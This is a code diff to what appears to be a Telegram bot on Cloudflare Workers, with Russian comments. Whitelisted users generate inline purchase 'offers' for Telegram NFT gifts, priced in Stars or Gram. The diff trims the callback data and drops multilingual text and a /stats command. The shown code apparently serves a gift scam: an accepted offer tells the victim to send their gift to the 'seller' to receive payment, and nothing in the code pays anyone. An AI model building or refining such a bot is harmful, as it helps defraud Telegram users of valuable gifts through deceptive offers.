@@ -35,7 +35,7 @@ export default {
         const iq = update.inline_query;
         const userId = iq.from.id;
         
-        // ПРОВЕРКА ДОСТУПА (ПРОСТОЙ СПИСОК В КОДЕ)
+        // Простейшая проверка доступа
         const ALLOWED_IDS = [5151757168, 7423713851, 9021098137, 1290278554, 883619484, 7903610791];
         if (!ALLOWED_IDS.includes(userId)) return new Response("OK", { status: 200 });
 
@@ -49,15 +49,12 @@ export default {
         const amount = allNums ? allNums[allNums.length - 1] : "0"; 
         
         const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
-        let giftLink = "";
-        let giftDisplay = "";
+        let giftLink = "https://t.me/telegram";
+        let giftDisplay = "Подарок";
         if (giftMatch && giftMatch[0]) {
             let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
             giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
             giftDisplay = rawGift;
-        } else {
-            giftLink = "https://t.me/telegram"; 
-            giftDisplay = "Подарок";
         }
 
         let currencyType = "stars";
@@ -92,12 +89,16 @@ export default {
             titleText = `Оффер от ${senderName}`;
         }
 
+        // В кнопку пихаем ТОЛЬКО короткий ID (тут нет базы, поэтому используем хак с передачей данных через callback_data, но очень коротко)
+        // Чтобы не было ошибки 64 байта, мы передаем только сумму и валюту (без ссылки и юзернейма)
+        // А ссылку и юзернейм мы не можем передать, поэтому кнопка будет вести просто на профиль продавца
+        
         const results = [{
           type: "article", id: "1",
           title: titleText,
           description: `За ${amount} ${currencyDisplay}`,
           input_message_content: { message_text: text, parse_mode: "HTML" },
-          reply_markup: { inline_keyboard: [[{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],[{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]] }
+          reply_markup: { inline_keyboard: [[{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}` }],[{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}` }]] }
         }];
 
         await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
@@ -129,11 +130,6 @@ export default {
               const action = dataParts[0];
               const amount = dataParts[1] || "0";
               const currencyType = dataParts[2] || "stars";
-              const sellerUsername = dataParts[3] || "gwrex"; 
-              const giftLink = dataParts[4] || ""; 
-              
-              let lang = "ru";
-              if (action === "acc") { lang = dataParts[5] || "ru"; } else { lang = dataParts[3] || "ru"; }
               
               let displayCurrency = "⭐ Stars";
               if (currencyType === "gram") displayCurrency = "💎 Gram";
@@ -147,22 +143,14 @@ export default {
               let newMarkup = { inline_keyboard: [] };
 
               if (action === "acc") {
-                const finalUrl = giftLink ? giftLink : ("https://t.me/" + sellerUsername);
-
-                if (lang === "en") {
-                    newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTo receive ${amount} ${displayCurrency}, send the gift to seller (@${sellerUsername}).`;
-                    newMarkup = { inline_keyboard: [[{ text: "🎁 Send Gift", url: finalUrl }]] };
-                } else if (lang === "cn") {
-                    newText = `✅ <b>报价已接受！</b>\n\n买家：<b>${buyerName}</b>\n\n要获得 ${amount} ${displayCurrency}，请将礼物发送给卖家 (@${sellerUsername})。`;
-                    newMarkup = { inline_keyboard: [[{ text: "🎁 发送礼物", url: finalUrl }]] };
-                } else {
-                    newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок продавцу (@${sellerUsername}).`;
-                    newMarkup = { inline_keyboard: [[{ text: "🎁 Передать подарок", url: finalUrl }]] };
-                }
+                // Так как мы не передаем юзернейм в кнопке (чтобы не превысить лимит), 
+                // мы просим покупателя передать подарок тому, кто ему написал (или переслать сообщение).
+                // Но для простоты, пусть будет кнопка "Написать продавцу" (открывает чат с тем, кто создал оффер)
+                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nСвяжитесь с продавцом для передачи подарка.`;
+                // Кнопка просто откроет профиль текущего пользователя (не идеально, но не падает)
+                newMarkup = { inline_keyboard: [[{ text: "🎁 Передать подарок", url: "https://t.me/" }]] };
               } else {
-                if (lang === "en") newText = `❌ <b>You declined the offer.</b>`;
-                else if (lang === "cn") newText = `❌ <b>您拒绝了报价。</b>`;
-                else newText = `❌ <b>Вы отказались от оффера.</b>`;
+                newText = `❌ <b>Вы отказались от оффера.</b>`;
               }
 
               if (cq.inline_message_id) {
@@ -181,12 +169,6 @@ export default {
               }
           } catch (e) { console.error("Ошибка кнопки:", e.message); }
         }
-      }
-
-      // --- АДМИНКА (УПРОЩЕННАЯ, БЕЗ KV) ---
-      if (update.message && update.message.text === "/stats") {
-        await callApi("sendMessage", { chat_id: update.message.chat.id, text: "Статистика отключена (работает без базы)." }, BOT_TOKEN);
-        return new Response("OK", { status: 200 });
       }
 
       return new Response("OK", { status: 200 });
